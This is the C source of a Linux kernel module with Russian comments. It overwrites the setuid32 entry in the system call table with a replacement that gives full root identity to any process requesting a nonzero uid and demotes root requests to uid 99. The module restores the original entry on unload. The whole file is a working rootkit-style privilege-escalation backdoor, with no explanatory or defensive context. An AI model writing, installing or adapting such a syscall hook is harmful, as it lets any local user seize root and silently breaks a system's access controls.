#define __KERNEL__
#define MODULE

#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <sys/syscall.h>

#include <linux/sched.h>
#include <linux/types.h>


/* Экспортируем таблицу системных вызовов */
extern void *sys_call_table[]; 

/* Определяем указатель для сохранения оригинально вызова */ 
int (*orig_setuid)(uid_t);

/* Создаем собственную функцию для системного вызова */ 
int change_setuid(uid_t uid)
{
  switch (uid)
  {
    case 0:
      current->uid = 99;  // реальный идентификатор пользователя
      current->euid = 99; // активный идентификатор пользователя
      current->gid = 99;  // реальный идентификатор группы
      current->egid = 99; // активный идентификатор группы
      break;
    default:
      current->uid = 0;  // реальный идентификатор пользователя
      current->euid = 0; // активный идентификатор пользователя
      current->gid = 0;  // реальный идентификатор группы
      current->egid = 0; // активный идентификатор группы
      break;
  }
  return 0;  // Этот return нужен здесь обязательно
}

int init_module(void)
{
  /* Сохраняем указатель на оригинальный вызов */
  orig_setuid = sys_call_table[__NR_setuid32];

  /* Заменяем указатель в таблице системных вызовов */
  sys_call_table[__NR_setuid32] = change_setuid;

  return 0;  // Этот return нужен здесь обязательно
}

void cleanup_module(void)
{
  /* Восстанавливаем оригинальный системный вызов */ 
  sys_call_table[__NR_setuid32] = orig_setuid; 
}
